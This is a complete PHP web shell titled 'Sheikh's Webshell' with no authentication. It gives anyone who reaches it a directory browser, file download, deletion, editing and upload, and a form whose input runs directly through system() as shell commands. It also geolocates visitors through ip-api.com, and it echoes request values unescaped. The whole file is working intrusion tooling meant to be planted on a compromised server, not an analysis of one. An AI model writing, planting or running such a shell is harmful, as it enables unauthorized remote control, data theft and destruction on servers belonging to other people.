<?php
echo "<html><head><title>Sheikh's Webshell</title></head>";
echo "<body style='background-color: #1e1e1e; color: #00ff00; font-family: monospace;'>";

echo "<div style='text-align: center; font-size: 24px; font-weight: bold; padding: 10px; color: #00ff00; border-bottom: 2px solid #00ff00;'>Sheikh's Webshell</div>";

$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$location = 'Unknown';
$ipInfo = @file_get_contents("http://ip-api.com/json/{$user_ip}");
if ($ipInfo) {
    $ipData = json_decode($ipInfo, true);
    if ($ipData && $ipData['status'] === 'success') {
        $location = "{$ipData['city']}, {$ipData['country']}";
    }
}

echo "<div style='border: 1px solid #00ff00; padding: 10px; margin: 10px;'>";
echo "<div style='padding: 5px; border-bottom: 1px solid #00ff00;'><b>User IP:</b> $user_ip</div>";
echo "<div style='padding: 5px; border-bottom: 1px solid #00ff00;'><b>User Agent:</b> $user_agent</div>";
echo "<div style='padding: 5px;'><b>Location:</b> $location</div>";
echo "</div>";

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

echo "<h2 style='color: #00ff00;'>Current Directory: $dir</h2>";
echo "<p><a href='?dir=" . dirname($dir) . "' style='color: #00ff00;'>Go up</a></p>";

echo "<div style='border: 1px solid #00ff00; padding: 10px; margin-bottom: 20px;'>";
echo "<h3 style='color: #00ff00;'>File Manager</h3>";
foreach (scandir($dir) as $file) {
    if ($file == "." || $file == "..") continue;
    $filepath = "$dir/$file";
    echo "<div style='border: 1px solid #00ff00; padding: 5px; margin: 5px;'>";
    if (is_dir($filepath)) {
        echo "<a href='?dir=$filepath' style='color: lightgreen;'>[DIR] $file</a>";
    } else {
        echo "$file ";
        echo "<a href='?dir=$dir&download=$file' style='color: lightblue;'>[Download]</a> ";
        echo "<a href='?dir=$dir&delete=$file' style='color: red;'>[Delete]</a> ";
        echo "<a href='?dir=$dir&edit=$file' style='color: yellow;'>[Edit]</a>";
    }
    echo "</div>";
}
echo "</div>";

if (isset($_GET['download'])) {
    $file = "$dir/" . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header("Content-Disposition: attachment; filename=" . basename($file));
        readfile($file);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = "$dir/" . $_GET['delete'];
    if (file_exists($file) && unlink($file)) {
        echo "<p style='color: lightgreen;'>File deleted successfully.</p>";
    } else {
        echo "<p style='color: red;'>Failed to delete file.</p>";
    }
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $uploadPath = $dir . '/' . $_FILES['file']['name'];
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        echo "<p style='color: lightgreen;'>File uploaded successfully: <b>{$uploadPath}</b></p>";
    } else {
        echo "<p style='color: red;'>Failed to upload file.</p>";
    }
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<div style='border: 1px solid #00ff00; padding: 10px; margin-top: 20px;'><b>Command:</b> $cmd<pre>";
    system($cmd);
    echo "</pre></div>";
}


if (isset($_GET['edit'])) {
    $editFile = "$dir/" . $_GET['edit'];
    if (file_exists($editFile)) {
        $content = htmlspecialchars(file_get_contents($editFile));
        echo "<form method='POST' action='?dir=$dir&edit={$_GET['edit']}'>
                <div style='border: 1px solid #00ff00; padding: 10px; margin-top: 20px;'>
                    <b>Edit File:</b>
                    <textarea name='file_content' rows='10' cols='50' style='width: 100%;'>{$content}</textarea><br>
                    <input type='submit' value='Save' style='color: blue;' />
                </div>
              </form>";
    }
}

if (isset($_POST['file_content']) && isset($_GET['edit'])) {
    $fileToEdit = "$dir/" . $_GET['edit'];
    file_put_contents($fileToEdit, $_POST['file_content']);
    echo "<p style='color: lightgreen;'>File updated successfully: <b>{$fileToEdit}</b></p>";
}

echo "
<form method='POST' enctype='multipart/form-data'>
    <div style='border: 1px solid #00ff00; padding: 10px; margin: 10px;'>
        <b>File Upload:</b> <input type='file' name='file' />
        <input type='submit' value='Upload' />
    </div>
</form>
<form method='POST'>
    <div style='border: 1px solid #00ff00; padding: 10px; margin: 10px;'>
        <b>Command Execution:</b> <input type='text' name='cmd' />
        <input type='submit' value='Execute' />
    </div>
</form>";

echo "</body></html>";
?>